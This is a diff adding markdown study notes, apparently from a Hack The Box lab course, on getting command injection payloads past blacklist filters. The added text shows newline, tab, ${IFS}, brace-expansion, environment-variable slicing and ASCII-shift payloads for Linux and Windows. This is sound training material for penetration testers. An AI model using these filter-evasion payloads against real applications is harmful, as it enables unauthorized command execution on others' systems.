@@ -393,3 +393,202 @@ This tells you:
     - Test one character at a time
     - Compare behavior
 
+## Bypassing Space Filters 
+
+When applications blacklist **spaces**, attackers can still separate command arguments using alternative shell features. Below are **practical, commonly working bypasses** (Linux-focused, but some apply elsewhere).
+
+### 1. Using a Newline as the Injection Operator
+
+If `;`, `&&`, `||` are blocked, **newline** is often still allowed.
+
+- Newline (URL-encoded): `%0a`
+
+**Test**
+
+`127.0.0.1%0a`
+
+✅ Works → newline is **not blacklisted** and can be used as the command separator.
+
+### 2. Identifying the Space Filter
+
+Attempting:
+
+`127.0.0.1%0a whoami`
+
+❌ `Invalid input`
+
+This confirms:
+
+- Newline is allowed
+- **Space character is blocked**
+
+### 3. Space Bypass Techniques
+
+#### A) Tabs Instead of Spaces
+
+Tabs are treated as whitespace by shells.
+- Tab (URL-encoded): `%09`
+
+**Payload**
+
+`127.0.0.1%0a%09whoami`
+
+✅ Works  
+**Why:** Shell interprets tab as a space.
+
+#### B) Using `$IFS` (Internal Field Separator)
+
+`$IFS` expands to a space/tab by default.
+
+**Payload**
+
+`127.0.0.1%0a${IFS}whoami`
+
+✅ Works  
+**Why:** Variable expansion recreates whitespace at runtime.
+
+> Tip: `${IFS}` is safer than `$IFS` if certain characters are filtered.
+
+#### C) Bash Brace Expansion
+
+Brace expansion implicitly separates arguments.
+
+**Local Example**
+
+`{ls,-la}`
+
+**Injection Payload**
+
+`127.0.0.1%0a{ls,-la}`
+
+✅ Works  
+**Why:** Bash expands `{cmd,arg}` → `cmd arg` without literal spaces.
+
+### Why These Bypasses Work
+
+- Filters often check **raw input**, not **shell-expanded input**
+- Shell features (`IFS`, tabs, braces) recreate spaces **after** filtering
+- Blacklists rarely cover **all valid shell syntax**
+### Key Takeaways
+
+- Space filters are **weak defenses**
+- Common bypasses:
+    
+    - `%09` (tab)
+    - `${IFS}`
+    - Brace expansion `{cmd,arg}`
+        
+- Combine with allowed operators (like newline `%0a`) for clean execution
+- Always test **one character at a time** to fingerprint filters
+
+## Bypassing Other Blacklisted Characters
+
+When filters block characters like `/`, `\`, or `;`, we can **generate those characters indirectly** at runtime instead of typing them literally. Below are **reliable, real-world bypass techniques** for Linux and Windows.
+
+### 1. Linux — Using Environment Variable Substrings
+
+Shell variables often **contain useful characters**. We can extract **exact characters** using substring syntax:
+
+`${VAR:offset:length}`
+
+#### Getting a Slash `/`
+
+The `$PATH` variable usually starts with `/`:
+
+`${PATH:0:1}`
+
+ **Expands to:**
+
+`/`
+
+Other useful variables:
+
+- `${PWD}`
+- `${HOME}`
+    
+#### Getting a Semicolon `;`
+
+Some environment variables contain `;`, such as `LS_COLORS`.
+Example:
+
+`${LS_COLORS:10:1}`
+
+Expands to:
+
+`;`
+
+**Use:**
+
+`printenv`
+
+to inspect all environment variables and find characters you need.
+
+#### Practical Payload Example
+
+Bypassing **semicolon + space** filters:
+
+`127.0.0.1${LS_COLORS:10:1}${IFS}`
+
+Expands to:
+
+`127.0.0.1;` 
+
+✔ Filter bypassed  
+✔ Injection operator restored
+
+### 2. Windows — CMD Environment Variable Expansion
+
+Windows variables can also be sliced.
+#### Getting a Backslash `\` (CMD)
+
+`%HOMEPATH:~6,-11%`
+
+Why it works:
+
+- `%HOMEPATH%` → `\Users\htb-student`
+- Slice isolates the `\`
+### 3. Windows — PowerShell Character Indexing
+
+PowerShell treats strings as arrays.
+#### Getting a Backslash `\`
+
+`$env:HOMEPATH[0]`
+
+#### Exploring variables
+
+`Get-ChildItem Env:`
+
+Use indexing to extract any needed character.
+### 4. Character Shifting (Linux)
+
+When a character is blocked, you can **derive it from a nearby ASCII value**.
+
+### Example: Producing `\`
+
+ASCII:
+
+- `[` = 91
+- `\` = 92
+
+Command:
+
+`echo $(tr '!-}' '"-~'<<<[)`
+
+✔ Outputs:
+
+`\`
+
+## Key Takeaways
+
+- Blacklists are **fundamentally weak**
+- Characters can be:
+    
+    - Extracted from environment variables
+    - Generated via substring slicing
+    - Reconstructed using ASCII shifts
+        
+- These bypasses work because:
+    
+    - Filtering happens **before shell expansion**
+    - The shell reconstructs characters **after validation**
+
